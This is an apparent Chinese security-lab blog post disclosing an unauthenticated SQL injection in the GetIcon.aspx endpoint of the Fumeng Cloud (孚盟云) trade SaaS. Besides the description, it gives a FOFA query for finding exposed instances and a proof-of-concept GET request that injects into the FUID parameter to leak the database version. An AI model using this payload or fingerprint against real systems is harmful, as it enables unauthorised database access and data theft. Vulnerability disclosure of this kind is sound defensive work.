> **原文链接**: https://mp.weixin.qq.com/s?__biz=Mzk5MDYxODcwMA==&mid=2247483898&idx=1&sn=479ca01aab6c21e9d19081497f01a809

#  孚盟云 Getlcon.aspx 接口存在SQL 注入漏洞  
原创 zz  星络安全实验室   2025-07-13 14:49  
  
<table><tbody><tr><td data-colwidth="576"><section><span style="color: rgba(0, 0, 0, 0.9);font-family: &#34;PingFang SC&#34;, system-ui, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 16px;font-style: normal;font-variant-ligatures: normal;font-variant-caps: normal;font-weight: 400;letter-spacing: 0.544px;orphans: 2;text-align: justify;text-indent: 0px;text-transform: none;widows: 2;word-spacing: 0px;-webkit-text-stroke-width: 0px;background-color: rgb(255, 255, 255);text-decoration-thickness: initial;text-decoration-style: initial;text-decoration-color: initial;display: inline !important;float: none;" data-pm-slice="0 0 []"><span leaf="">免责声明:文章中涉及的漏洞均已修复，敏感信息均已做打码处理，文章仅做经验分享用途，未授权的攻击属于非法行为!文章中敏感信息均已做多层打码处理。传播、利用本文章所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责作者不为此承担任何责任，一旦造成后果请自行负责</span></span></section></td></tr></tbody></table>  
  
漏洞详情：  
  
上海孚盟软件有限公司是一家专注于外贸SaaS服务及行业解决方案的公司。其核心产品孚盟云的GetIcon.aspx接口存在SQL注入漏洞。攻击者无需身份验证即可通过精心构造的恶意请求参数注入SQL语句，可能造成数据库敏感信息泄露、数据被篡改，甚至系统权限被提升，从而严重威胁系统的数据安全性和完整性。  
  
漏洞复现：  
  
fofa：  

```
app=&#34;孚盟软件-孚盟云&#34;
```

  
![](https://mmbiz.qpic.cn/mmbiz_png/ZxIkWliazrVcyeMicaUgQRibicdI4CCkWlFsMp5aLIMFbXoEyTIx9FmibXYwtOSV5OqXAlcaIKLCQXaj17urficOPnuw/640?wx_fmt=png&from=appmsg "")  
  
  
poc：  
  
受用户控制参数FUID没有进行过滤可以直接拼接成sql语句执行，利用报错注入查询数据库版本  

```
GET /Common/GetIcon.aspx?FUID=-1'and+1=@@VERSION-- HTTP/1.1
```

  
![](https://mmbiz.qpic.cn/mmbiz_png/ZxIkWliazrVcyeMicaUgQRibicdI4CCkWlFsWDFlGiap22Lul90ibyvzIMvq8gthicF1UoLf4qS84xsogWEN5mklKibpBA/640?wx_fmt=png&from=appmsg "")  
  
  
修复意见：  
  
关注厂商动态，升级至安全版本  
  
  
